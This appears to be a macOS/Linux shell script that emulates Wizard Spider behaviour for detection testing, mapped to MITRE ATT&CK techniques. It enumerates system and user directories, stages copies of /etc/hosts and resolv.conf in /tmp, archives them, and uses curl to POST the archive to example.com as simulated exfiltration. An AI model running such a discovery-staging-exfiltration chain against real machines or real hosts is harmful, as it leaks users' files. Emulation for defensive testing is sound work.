# description: Wizard Spider-like process chain for staging, archive, and simulated exfiltration
# actor: Wizard Spider (TrickBot / Conti lineage) — behavioural emulation only
# mitre: T1083, T1074.001, T1560.001, T1041, T1059.004
# reference: https://attack.mitre.org/groups/G0102/
# reference: https://attack.mitre.org/techniques/T1074/001/
# reference: https://attack.mitre.org/techniques/T1560/001/
# reference: https://attack.mitre.org/techniques/T1041/
# reference: https://attack.mitre.org/techniques/T1059/004/

STAGE="/tmp/ws_stage_${ESGRAPH_RUN_ID:?ESGRAPH_RUN_ID is required}"; mkdir -p "${STAGE}"

# T1083 via child shell processes.
STAGE="/tmp/ws_stage_${ESGRAPH_RUN_ID}"; bash -c 'ls -la /etc > "$1/etc-list.txt"' _ "${STAGE}"
STAGE="/tmp/ws_stage_${ESGRAPH_RUN_ID}"; bash -c 'ls -la /Users > "$1/users-list.txt" 2>/dev/null || true' _ "${STAGE}"
STAGE="/tmp/ws_stage_${ESGRAPH_RUN_ID}"; bash -c 'ls -la /private/var/log > "$1/varlog-list.txt" 2>/dev/null || true' _ "${STAGE}"
STAGE="/tmp/ws_stage_${ESGRAPH_RUN_ID}"; bash -c 'find /Users -maxdepth 2 -type f 2>/dev/null | head -120 > "$1/user-files.txt" || true' _ "${STAGE}"

# T1074.001 local staging.
STAGE="/tmp/ws_stage_${ESGRAPH_RUN_ID}"; bash -c 'cp /etc/hosts "$1/hosts.copy" 2>/dev/null || true' _ "${STAGE}"
STAGE="/tmp/ws_stage_${ESGRAPH_RUN_ID}"; bash -c 'cp /etc/resolv.conf "$1/resolv.copy" 2>/dev/null || true' _ "${STAGE}"

# Build a manifest to add more write activity edges.
STAGE="/tmp/ws_stage_${ESGRAPH_RUN_ID}"; bash -c '{ echo "scenario=wizard_spider_staging"; echo "captured_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)"; ls -la "$1"; } > "$1/manifest.txt"' _ "${STAGE}"

# T1560.001
STAGE="/tmp/ws_stage_${ESGRAPH_RUN_ID}"; bash -c 'tar -czf "$1/stage.tgz" -C "$1" . 2>/dev/null || true' _ "${STAGE}"

# T1041 simulated exfiltration from staged archive.
STAGE="/tmp/ws_stage_${ESGRAPH_RUN_ID}"; bash -c '[[ -f "$1/stage.tgz" ]] && curl -m 3 -sS -o /dev/null -X POST https://example.com/ --data-binary @"$1/stage.tgz" || true' _ "${STAGE}"

STAGE="/tmp/ws_stage_${ESGRAPH_RUN_ID}"; bash -c 'ls -la "$1" 2>/dev/null || true' _ "${STAGE}"
